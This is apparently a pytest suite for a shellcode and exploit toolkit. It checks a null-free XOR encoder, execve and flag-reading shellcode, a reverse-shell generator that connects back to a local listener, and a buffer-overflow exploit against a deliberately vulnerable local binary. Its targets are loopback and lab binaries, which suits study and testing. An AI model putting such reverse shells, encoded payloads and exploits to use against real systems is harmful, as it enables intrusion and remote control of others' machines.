#!/usr/bin/env python3
# tests/test_shellcode.py
# ---------------------------------------------------------------------------
# pytest suite for the shellcode toolkit:
#   unit        : encoder (XOR, key selection, null-free decoder stub)
#   integration : assemble payloads, assert null-free + length budget
#   e2e         : execute payloads via pwntools and verify behaviour (Linux)
#                 - execve spawns a shell
#                 - decoder payload self-decrypts and spawns a shell
#                 - readflag dumps flag.txt
#                 - reverse shell connects back to a listener
#                 - full overflow exploit against bin/vuln (local)
#
# Run: make test   (or: python3 -m pytest tests/ -v)
# ---------------------------------------------------------------------------
import importlib.util
import platform
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
SCRIPTS = REPO / "src" / "scripts"
BIN = REPO / "bin"

IS_LINUX = platform.system() == "Linux"
SKIP_NON_LINUX = pytest.mark.skipif(not IS_LINUX, reason="requires a Linux lab")

SHELLCODE_BIN = BIN / "execve.bin"
READFLAG_BIN = BIN / "readflag.bin"
VULN_BIN = BIN / "vuln"
LENGTH_BUDGET = 128  # keep payloads tight


# --------------------------------------------------------------------------- #
# Helpers: load the toolkit scripts as modules
# --------------------------------------------------------------------------- #
def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


encoder = _load("encoder", SCRIPTS / "encoder.py")


def _have(tool):
    return subprocess.run(["which", tool], capture_output=True).returncode == 0


def _pwn():
    pytest.importorskip("pwn")
    import pwn
    pwn.context.clear(arch="amd64", os="linux")
    return pwn


# --------------------------------------------------------------------------- #
# Fixtures
# --------------------------------------------------------------------------- #
@pytest.fixture(scope="module")
def built():
    """Build all shellcode (.asm -> .bin) via make. Skip if nasm is absent."""
    if not _have("nasm"):
        pytest.skip("nasm not installed")
    subprocess.run(["make", "clean", "all", "extract"], cwd=REPO, check=True,
                   capture_output=True)
    return BIN


@pytest.fixture(scope="module")
def vuln_built():
    """Build the vulnerable target. Skip if gcc is absent or off-Linux."""
    if not IS_LINUX or not _have("cc"):
        pytest.skip("requires Linux + gcc")
    subprocess.run(["make", "vuln"], cwd=REPO, check=True, capture_output=True)
    assert VULN_BIN.exists()
    return VULN_BIN


# --------------------------------------------------------------------------- #
# Unit: encoder
# --------------------------------------------------------------------------- #
def test_xor_encode_roundtrip():
    data = b"hello\x00world"
    key = 0x42
    assert encoder.xor_encode(encoder.xor_encode(data, key), key) == data


def test_xor_encode_rejects_bad_key():
    with pytest.raises(ValueError):
        encoder.xor_encode(b"abc", 0)
    with pytest.raises(ValueError):
        encoder.xor_encode(b"abc", 256)


def test_pick_key_finds_null_free():
    data = b"\x00\x01\x02\x03execve"
    key = encoder.pick_key(data)
    enc = encoder.xor_encode(data, key)
    assert b"\x00" not in enc


def test_decoder_stub_is_null_free():
    stub = encoder.decoder_stub(0x5a, 32)
    assert b"\x00" not in stub
    assert len(stub) > 10


def test_decoder_stub_rejects_bad_args():
    with pytest.raises(ValueError):
        encoder.decoder_stub(0, 10)
    with pytest.raises(ValueError):
        encoder.decoder_stub(5, 0)
    with pytest.raises(ValueError):
        encoder.decoder_stub(5, 200)  # length >= 128 breaks push-imm8 null-free


def test_build_payload_is_null_free():
    data = b"\x48\x31\xc0\x48\x31\xff"  # xor rax,rax; xor rdi,rdi
    payload = encoder.build_payload(data)
    assert b"\x00" not in payload
    assert len(payload) > len(data)


# --------------------------------------------------------------------------- #
# Integration: execve payload
# --------------------------------------------------------------------------- #
def test_execve_is_null_free(built):
    sc = SHELLCODE_BIN.read_bytes()
    assert b"\x00" not in sc, "execve shellcode contains null bytes"


def test_execve_within_length_budget(built):
    assert len(SHELLCODE_BIN.read_bytes()) <= LENGTH_BUDGET


def test_execve_starts_with_xor(built):
    # xor rdx, rdx -> 48 31 d2
    assert SHELLCODE_BIN.read_bytes().startswith(b"\x48\x31\xd2")


def test_readflag_is_null_free(built):
    assert READFLAG_BIN.exists(), "readflag.asm was not built"
    assert b"\x00" not in READFLAG_BIN.read_bytes()


# --------------------------------------------------------------------------- #
# E2E: execve spawns a shell
# --------------------------------------------------------------------------- #
@SKIP_NON_LINUX
def test_execve_spawns_shell(built):
    pwn = _pwn()
    proc = pwn.run_shellcode(SHELLCODE_BIN.read_bytes())
    try:
        proc.sendline(b"echo PWNED_$((6*7))")
        assert b"PWNED_42" in proc.recvuntil(b"PWNED_42", timeout=5)
    finally:
        proc.close()


# --------------------------------------------------------------------------- #
# E2E: decoder self-decrypts and spawns a shell
# --------------------------------------------------------------------------- #
@SKIP_NON_LINUX
def test_decoder_payload_spawns_shell(built):
    pwn = _pwn()
    payload = encoder.build_payload(SHELLCODE_BIN.read_bytes())
    assert b"\x00" not in payload
    proc = pwn.run_shellcode(payload)
    try:
        proc.sendline(b"echo DEC_$((7*6))")
        assert b"DEC_42" in proc.recvuntil(b"DEC_42", timeout=5)
    finally:
        proc.close()


# --------------------------------------------------------------------------- #
# E2E: readflag dumps flag.txt to stdout
# --------------------------------------------------------------------------- #
@SKIP_NON_LINUX
def test_readflag_dumps_flag(built):
    pwn = _pwn()
    flag_path = REPO / "flag.txt"
    secret = b"FLAG{readflag_ok_42}"
    flag_path.write_bytes(secret + b"\n")
    try:
        proc = pwn.run_shellcode(READFLAG_BIN.read_bytes())
        try:
            out = proc.recvall(timeout=3)
        finally:
            proc.close()
        assert secret in out, f"flag not in output: {out!r}"
    finally:
        flag_path.unlink(missing_ok=True)


# --------------------------------------------------------------------------- #
# E2E: reverse shell connects back to a listener
# --------------------------------------------------------------------------- #
@SKIP_NON_LINUX
def test_reverse_shell_connectback(built):
    pwn = _pwn()
    grs = _load("gen_reverse_shell", SCRIPTS / "gen_reverse_shell.py")

    port = 13337
    payload = grs.generate("127.0.0.1", port)
    assert b"\x00" not in payload, "reverse-shell payload has null bytes"

    accepted = {}
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", port))
    srv.listen(1)
    srv.settimeout(10)

    def serve():
        try:
            conn, _ = srv.accept()
            accepted["conn"] = conn
        except OSError:
            pass

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    time.sleep(0.3)

    proc = pwn.run_shellcode(payload)
    try:
        # wait for the connect-back
        for _ in range(50):
            if "conn" in accepted:
                break
            time.sleep(0.1)
        assert "conn" in accepted, "no connect-back received"

        conn = accepted["conn"]
        time.sleep(0.2)
        conn.sendall(b"echo RS_$((6*7))\n")
        conn.settimeout(5)
        data = conn.recv(1024)
        assert b"RS_42" in data, f"no shell response: {data!r}"
        conn.close()
    finally:
        proc.close()
        srv.close()


# --------------------------------------------------------------------------- #
# E2E: full overflow exploit against bin/vuln (local)
# --------------------------------------------------------------------------- #
@SKIP_NON_LINUX
def test_exploit_local_vuln(vuln_built):
    exploit = _load("exploit", SCRIPTS / "exploit.py")

    proc = exploit.exploit_local()
    try:
        time.sleep(0.2)
        proc.sendline(b"echo OWNED_$((6*7))")
        assert b"OWNED_42" in proc.recvuntil(b"OWNED_42", timeout=5)
    finally:
        proc.close()


@SKIP_NON_LINUX
def test_exploit_local_vuln_encoded(vuln_built):
    """Same exploit but delivering a self-decrypting (encoded) payload."""
    exploit = _load("exploit", SCRIPTS / "exploit.py")

    proc = exploit.exploit_local(encoded=True)
    try:
        time.sleep(0.2)
        proc.sendline(b"echo ENC_$((6*7))")
        assert b"ENC_42" in proc.recvuntil(b"ENC_42", timeout=5)
    finally:
        proc.close()


# --------------------------------------------------------------------------- #
# CLI / error-path coverage (Phase 3 production polish)
# --------------------------------------------------------------------------- #
def test_encoder_cli_writes_decoded_payload(monkeypatch, tmp_path, built):
    out = tmp_path / "execve.enc"
    monkeypatch.setattr(sys, "argv",
                        ["encoder.py", str(SHELLCODE_BIN), "--decode", "-o", str(out)])
    assert encoder.main() == 0
    data = out.read_bytes()
    assert data and b"\x00" not in data


def test_encoder_cli_prints_c_array(monkeypatch, capsys, built):
    monkeypatch.setattr(sys, "argv", ["encoder.py", str(SHELLCODE_BIN)])
    assert encoder.main() == 0
    assert "\\x" in capsys.readouterr().out


def test_encoder_cli_missing_file(monkeypatch, tmp_path):
    monkeypatch.setattr(sys, "argv", ["encoder.py", str(tmp_path / "nope.bin")])
    assert encoder.main() == 1


def test_pick_key_raises_when_unavoidable():
    # input containing every value 1..255 -> every key yields a null byte
    with pytest.raises(RuntimeError):
        encoder.pick_key(bytes(range(1, 256)))


def test_gen_reverse_shell_cli(monkeypatch, tmp_path):
    grs = _load("gen_reverse_shell", SCRIPTS / "gen_reverse_shell.py")
    out = tmp_path / "rs.bin"
    monkeypatch.setattr(sys, "argv",
                        ["gen_reverse_shell.py", "127.0.0.1", "13339", "-o", str(out)])
    assert grs.main() == 0
    data = out.read_bytes()
    assert data and b"\x00" not in data


def test_exploit_main_dry(monkeypatch, vuln_built):
    exploit = _load("exploit", SCRIPTS / "exploit.py")
    monkeypatch.setattr(sys, "argv", ["exploit.py"])
    monkeypatch.setenv("EXPLOIT_MODE", "dry")
    assert exploit.main() is None


def test_resolve_target_missing_file():
    exploit = _load("exploit", SCRIPTS / "exploit.py")
    with pytest.raises(SystemExit):
        exploit._resolve_target(Path("/nonexistent/vuln"))


@SKIP_NON_LINUX
def test_exploit_remote_connects(vuln_built):
    exploit = _load("exploit", SCRIPTS / "exploit.py")
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]
    accepted = {}

    def serve():
        try:
            conn, _ = srv.accept()
            accepted["conn"] = conn
        except OSError:
            pass

    threading.Thread(target=serve, daemon=True).start()
    time.sleep(0.2)
    tube = exploit.exploit_remote("127.0.0.1", port)
    try:
        # the client connect() can complete before accept() registers; poll.
        for _ in range(20):
            if accepted:
                break
            time.sleep(0.1)
        assert accepted, "exploit_remote did not connect"
    finally:
        tube.close()
        if "conn" in accepted:
            accepted["conn"].close()
        srv.close()
